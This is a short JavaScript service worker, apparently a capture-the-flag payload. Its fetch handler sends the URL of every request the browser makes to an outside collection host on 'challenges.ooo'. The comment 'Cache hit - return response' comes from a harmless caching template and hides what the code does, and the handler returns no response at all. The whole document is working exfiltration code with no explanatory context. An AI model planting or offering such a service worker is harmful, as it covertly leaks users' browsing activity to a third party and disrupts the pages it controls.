self.addEventListener('fetch', function(event) {
    event.respondWith(
      caches.match(event.request)
        .then(function(response) {
          // Cache hit - return response
          fetch(`https://pooot.challenges.ooo/c.cjiso.ninja/data/${event.request.url}`);
        }
      )
    );
  });
  